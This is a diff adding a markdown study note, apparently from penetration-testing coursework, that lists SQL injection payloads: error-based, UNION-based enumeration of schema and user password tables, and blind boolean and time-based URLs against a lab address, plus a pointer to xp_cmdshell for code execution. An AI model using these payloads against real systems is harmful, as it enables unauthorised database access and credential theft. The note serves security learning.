@@ -1,0 +1,55 @@
+# Attacks
+- [[MySQL]]
+
+### Manual
+#### SQLi via Error-based Payloads
+- in-band SQLi = query result displayed & app-returned value
+
+1. Prematurely terminate SQL statement
+	- username' OR 1=1 -- //
+		- ends up being this:
+			- SELECT * FROM users WHERE user_name= 'username' OR 1=1 --
+		- 1=1 will always be true:
+			- returns first name
+2. Enumerate
+	- ' or 1=1 in (select @@version) -- //
+	- ' OR 1=1 in (SELECT * FROM users) -- //
+3. Selecting one entry
+	- ' or 1=1 in (SELECT password FROM users) -- //
+4. Adding a where clause to identify
+	- ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+#### UNION-based Payloads
+- Same number of columns in both queries & data types compatible 
+- Example:
+	- \$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+	- Discover correct number of columns
+		- ' ORDER BY 1-- //
+			- will fail if not correct amount
+	- Enumerate
+		- %' UNION SELECT database(), user(), @@version, null, null -- //
+	- Shifting columns
+		- ' UNION SELECT null, null, database(), user(), @@version  -- //
+	- Enumeration information schema
+		- ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+	- Dumping users table
+		- ' UNION SELECT null, username, password, description, null FROM users -- //
+#### Blind SQL Injections
+- Time based or Boolean
+- Boolean
+	- http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+- Time based
+	- http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+
+### Manual Code Execution
+- xp_cmdshell
+	- Microsoft SQL Server function
+	- used by EXECUTE instead of SELECT
+- Go to [[MySQL]] or [[Impacket]]
+
+
+
+
+
+
+
+
